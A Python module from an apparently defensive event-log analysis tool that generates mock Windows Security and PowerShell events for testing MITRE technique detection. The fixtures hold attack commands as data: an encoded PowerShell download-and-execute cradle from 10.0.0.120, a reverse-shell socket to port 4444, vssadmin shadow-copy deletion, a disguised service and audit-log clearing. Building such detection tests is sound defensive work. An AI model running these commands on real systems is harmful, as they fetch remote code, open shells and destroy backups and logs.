from datetime import datetime, timedelta
from typing import List

from nevtx.analysis.mitre import MitreEngine
from nevtx.core.models import EventRecord


def generate_mock_events() -> List[EventRecord]:
    """Generates realistic DFIR Windows Event Log records for demonstration & testing."""
    now = datetime.now()

    # Base64 encoded payload: "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.120/rev.ps1')"
    # UTF-16LE encoded in base64:
    b64_powershell = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAwAC4AMQAyADAALwByAGUAdgAuAHAAcwAxACcAKQA="

    raw_list = [
        {
            "record_id": 101,
            "timestamp": now - timedelta(minutes=60),
            "event_id": 4624,
            "provider": "Microsoft-Windows-Security-Auditing",
            "channel": "Security",
            "level": "Information",
            "computer": "DC-CORP.local",
            "data": {
                "TargetUserName": "jdoe",
                "TargetDomainName": "CORP",
                "LogonType": "2",
                "IpAddress": "192.168.1.55",
            },
            "summary": "Logon: CORP\\jdoe (Type: 2 - Interactive)",
        },
        {
            "record_id": 102,
            "timestamp": now - timedelta(minutes=45),
            "event_id": 4625,
            "provider": "Microsoft-Windows-Security-Auditing",
            "channel": "Security",
            "level": "Warning",
            "computer": "DC-CORP.local",
            "data": {
                "TargetUserName": "Administrator",
                "TargetDomainName": "CORP",
                "Status": "0xC000006D",
                "SubStatus": "0xC000006A",
                "IpAddress": "10.0.0.120",
            },
            "summary": "Failed Logon: Administrator (Status: 0xC000006D - Bad Password)",
        },
        {
            "record_id": 103,
            "timestamp": now - timedelta(minutes=30),
            "event_id": 4688,
            "provider": "Microsoft-Windows-Security-Auditing",
            "channel": "Security",
            "level": "Information",
            "computer": "DC-CORP.local",
            "data": {
                "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
                "CommandLine": "cmd.exe /c whoami /priv",
                "SubjectUserName": "svc_sql",
            },
            "summary": "Process: cmd.exe /c whoami /priv",
        },
        {
            "record_id": 104,
            "timestamp": now - timedelta(minutes=25),
            "event_id": 4688,
            "provider": "Microsoft-Windows-Security-Auditing",
            "channel": "Security",
            "level": "Warning",
            "computer": "DC-CORP.local",
            "data": {
                "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": f"powershell.exe -NoP -NonI -W Hidden -enc {b64_powershell}",
                "SubjectUserName": "svc_sql",
            },
            "summary": f"Process: powershell.exe -enc {b64_powershell[:35]}...",
        },
        {
            "record_id": 105,
            "timestamp": now - timedelta(minutes=20),
            "event_id": 4104,
            "provider": "Microsoft-Windows-PowerShell",
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "level": "Warning",
            "computer": "DC-CORP.local",
            "data": {
                "ScriptBlockText": "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.120', 4444); $stream = $client.GetStream();",
            },
            "summary": "ScriptBlock: $client = New-Object System.Net.Sockets.TCPClient('10.0.0.120', 4444)...",
        },
        {
            "record_id": 106,
            "timestamp": now - timedelta(minutes=15),
            "event_id": 4688,
            "provider": "Microsoft-Windows-Security-Auditing",
            "channel": "Security",
            "level": "Critical",
            "computer": "DC-CORP.local",
            "data": {
                "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
                "SubjectUserName": "Administrator",
            },
            "summary": "Process: vssadmin.exe delete shadows /all /quiet",
        },
        {
            "record_id": 107,
            "timestamp": now - timedelta(minutes=10),
            "event_id": 7045,
            "provider": "Service Control Manager",
            "channel": "System",
            "level": "Warning",
            "computer": "DC-CORP.local",
            "data": {
                "ServiceName": "WindowsUpdaterSvc",
                "ImagePath": "C:\\Users\\Public\\updater.exe",
                "ServiceType": "user mode service",
                "StartType": "auto start",
            },
            "summary": "New Service: WindowsUpdaterSvc -> C:\\Users\\Public\\updater.exe",
        },
        {
            "record_id": 108,
            "timestamp": now - timedelta(minutes=2),
            "event_id": 1102,
            "provider": "Microsoft-Windows-Eventlog",
            "channel": "Security",
            "level": "Critical",
            "computer": "DC-CORP.local",
            "data": {
                "SubjectUserName": "Administrator",
                "SubjectDomainName": "CORP",
            },
            "summary": "Audit Log Cleared: The security audit log was cleared by Administrator",
        },
    ]

    events: List[EventRecord] = []
    for item in raw_list:
        data = item["data"]
        event_id = item["event_id"]
        mitre_matches = MitreEngine.analyze(event_id, data)

        combined_text = " ".join(str(v) for v in data.values())
        decoded = MitreEngine.extract_base64_payloads(combined_text)

        rec = EventRecord(
            record_id=item["record_id"],
            timestamp=item["timestamp"],
            event_id=event_id,
            provider=item["provider"],
            channel=item["channel"],
            level=item["level"],
            computer=item["computer"],
            raw_xml=f'{{"Event": {{"System": {{"EventID": {event_id}}}}}}}',
            data=data,
            tags=[m.technique_id for m in mitre_matches],
            summary=item["summary"],
            mitre_matches=mitre_matches,
            decoded_payloads=decoded,
        )
        events.append(rec)

    return events
